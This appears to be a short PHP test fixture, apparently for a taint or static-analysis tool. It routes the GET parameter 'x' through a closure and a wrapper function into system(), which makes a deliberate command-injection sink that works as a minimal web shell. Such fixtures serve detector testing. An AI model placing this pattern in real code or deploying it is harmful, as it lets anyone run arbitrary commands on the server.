<?php
// two-deep function wrapper with closure hop
function inner($p) {
    system($p);
}
$mid = function ($v) {
    inner($v);
};
$mid($_GET['x']);
